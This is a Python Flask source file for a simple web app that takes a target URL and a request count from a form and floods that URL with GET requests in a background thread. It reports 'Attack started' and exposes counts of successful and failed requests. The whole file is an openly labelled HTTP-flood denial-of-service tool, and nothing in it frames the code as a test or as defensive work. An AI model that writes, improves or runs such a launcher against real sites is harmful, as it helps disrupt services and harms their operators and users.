from flask import Flask, request, render_template, jsonify
import threading
import requests
import time

app = Flask(__name__)

# Store statistics
stats = {
    'total_sent': 0,
    'total_failed': 0,
    'start_time': None,
    'end_time': None
}

def send_requests(url, num_requests):
    global stats
    stats['start_time'] = time.time()
    for _ in range(num_requests):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                stats['total_sent'] += 1
            else:
                stats['total_failed'] += 1
        except requests.exceptions.RequestException:
            stats['total_failed'] += 1
    stats['end_time'] = time.time()

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        target_url = request.form['url']
        num_requests = int(request.form['num_requests'])

        # Start the attack in a separate thread
        thread = threading.Thread(target=send_requests, args=(target_url, num_requests))
        thread.start()
        return jsonify({"message": "Attack started", "target_url": target_url, "num_requests": num_requests})

    return render_template('index.html')

@app.route('/stats', methods=['GET'])
def get_stats():
    return jsonify(stats)

if __name__ == '__main__':
    app.run(debug=True)
